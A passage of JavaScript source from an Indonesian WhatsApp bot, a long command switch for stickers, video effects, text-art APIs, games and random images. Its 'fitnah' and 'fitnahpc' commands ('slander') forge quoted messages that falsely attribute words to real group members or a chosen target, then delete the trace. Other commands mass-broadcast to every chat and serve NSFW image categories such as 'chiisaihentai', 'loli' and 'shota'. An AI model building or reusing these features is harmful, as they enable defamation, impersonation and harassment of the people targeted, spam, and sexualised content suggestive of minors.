\`\`\`🦈 Lokasi : ${get_data[i].location}\`\`\`
\`\`\`🦈 Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`🦈 Stok : ${get_data[i].stock}\`\`\`
\`\`\`🦈 Informasi : ${get_data[i].information}\`\`\`
\`\`\`🦈 Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              itsmevall.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf produk ${query} tidak ditemukan`)
}
              break
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
      case "[💬status":
        grupinv(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        itsmevall.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
        case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				itsmevall.updatePresence(from, Presence.composing)
					anu = await itsmevall.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							itsmevall.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							itsmevall.sendMessage(_.jid, buff, sticker, { quoted: foncevid, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
      case "totag":
      if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
      if (isBanned) return reply(mess.ban)
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        itsmevall.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        grupinv(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await itsmevall.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await itsmevall.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
        case "tomp3":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
        if (!isQuotedVideo) return reply("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          itsmevall.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        limitAdd(sender, limit)
        break;
      case "fast":
        if (isBanned) return reply(mess.ban)
        if (!isQuotedVideo) return reply("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            itsmevall.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return reply("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            itsmevall.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return reply("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          itsmevall.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case 'buttons5':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
              itsmevall.relayWAMessage(prep)
              break
          case 'buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
              itsmevall.relayWAMessage(prep)
              break
          case 'tod':
              result =`*Truth Or Dare*\nPemain diberi pilihan antara menjawab pertanyaan dengan jujur, atau melakukan tantangan yang diberikan`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:ftex})
              itsmevall.relayWAMessage(prep)
              break
              case "yuri":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
	case 'halloween':
	if (isBanned) return reply(mess.ban)
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break				 
              case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
if (isBanned) return reply(mess.ban)                
if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
  const txs = itsmevall.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${itsmevall.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
              case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':
				if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (isBanned) return reply(mess.ban)			
              if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp KurrXdゑ v.3.0`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${encodeURIComponent(c)}`)
					itsmevall.sendMessage(from, atetepe, sticker, { quoted: mek })
					limitAdd(sender, limit)
					break        	
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
          if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
          if (isBanned) return reply(mess.ban)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await itsmevall.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: foncevid})
              itsmevall.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              limitAdd(sender, limit)
              break
// Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                reply(mess.wait)
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    limitAdd(sender, limit)
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                reply(mess.wait)
                if (!isPremium) return reply(mess.only.premium)
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    limitAdd(sender, limit)
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                reply(mess.wait)                
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    limitAdd(sender, limit)
                    break              
   case'liriklagu':
   case 'lirik':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    reply(mess.wait)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://hardianto.xyz/api/info/lirik?query=${query}&apikey=${hardi}`)
                    konto = `*LIRIK : ${query}*\n\n ${get_result.lirik}`
                    buffer = await getBuffer(get_result.thumb)
                    sendButLocation(from, `${konto}`,`© REALZIBOT`, {jpegThumbnail:buffer}, [{buttonId:`${prefix}nu`,buttonText:{displayText:'OKE'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
               break                     
                    case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':  
				case 'ttp':  
				case 'attp2':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp Tolol`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${encodeURIComponent(c)}`)
					itsmevall.sendMessage(from, atetepe, sticker, { quoted: mek })
					limitAdd(sender, limit)
					break
   case 'attp':
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
   if (isBanned) return reply(mess.ban)
      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftroli})
              if (args.length == 0) return reply(`Example: ${prefix + command} itsmevall`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              itsmevall.sendMessage(from, buffer, sticker, { quoted: mek })
              limitAdd(sender, limit)
              break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'stalkgithub':
      case 'githubstalk':
              if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              if (isBanned) return reply(mess.ban)
              if (args.length == 0) return reply(`Example: ${prefix + command} ikyy-chan02`)
              reply(mess.wait)
              username = args[0]
              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`📫 Username : ${ini_result.name}\`\`\`
\`\`\`🎞 Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`📟 Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`📮 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`📚 Following : ${ini_result.following}\`\`\`
\`\`\`📻 Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`🗃️ Link : ${ini_result.url}\`\`\`
`
             sendButLocation(from, `${ini_txt}`,`© REALZIBOT`, {jpegThumbnail:ini_buffer}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
             limitAdd(sender, limit)
             break  
					case 'infogempa':
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (isBanned) return reply(mess.ban)
					anu = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.waktu}\n❏ Magnitude : ${anu.result.magnitude}\n❏ Kedalaman : ${anu.result.kedalaman}\n❏ Koordinat : ${anu.result.koordinat}\n❏ Lokasi : ${anu.result.lokasi}\n❏ Potensi : ${anu.result.potensi}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.map)
					sendButLocation(from, `${gempa}`,`© REALZIBOT`, {jpegThumbnail:buff}, [{buttonId:`${prefix}mnu`,buttonText:{displayText:'OKE'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
					limitAdd(sender, limit)
					break
					case 'infogrup':
       case 'grupinfo':
       case 'groupinfo':
       if (isBanned) return reply(mess.ban)
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await itsmevall.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :*  : Aktif}\n*AntiLink :* Mati}\n*Desc :* \n${groupMetadata.desc}`
              aliya = await getBuffer(pic);
              sendButLocation(from, `${ingfo}`,`© REALZIBOT`, {jpegThumbnail:aliya}, [{buttonId:`${prefix}profile`,buttonText:{displayText:'Profile'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
              case 'patrick':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
      case "kontak":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        itsmevall.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        limitAdd(sender, limit)
        break;
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return reply('Sudah diaktifkan sebelumnya!')
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('Sudah di NonAktifkan sebelumnya!')
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break
      case 'welcome':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(welcom)return reply('Sudah diaktifkan sebelumnya!')
welcom = true
reply(`Succes mengaktifkan welcome`)
} else if (args[0] === "off") {
if(!welcom)return reply('Sudah di NonAktifkan sebelumnya!')
welcom = false
reply(`Succes mematikan welcome`)
} else {
